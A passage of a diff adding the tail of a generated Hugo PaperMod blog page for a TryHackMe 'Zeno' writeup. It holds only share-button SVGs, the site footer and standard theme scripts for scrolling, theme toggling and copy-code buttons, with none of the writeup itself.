-0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Zeno Thm Writeup Abusing Service File Misconfigurations on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Zeno Thm Writeup Abusing Service File Misconfigurations on whatsapp"
+        href="https://api.whatsapp.com/send?text=Zeno%20Thm%20Writeup%20Abusing%20Service%20File%20Misconfigurations%20-%20http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Zeno Thm Writeup Abusing Service File Misconfigurations on telegram"
+        href="https://telegram.me/share/url?text=Zeno%20Thm%20Writeup%20Abusing%20Service%20File%20Misconfigurations&amp;url=http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="http://xplo1t.me/">xplo1t&#39;s site</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
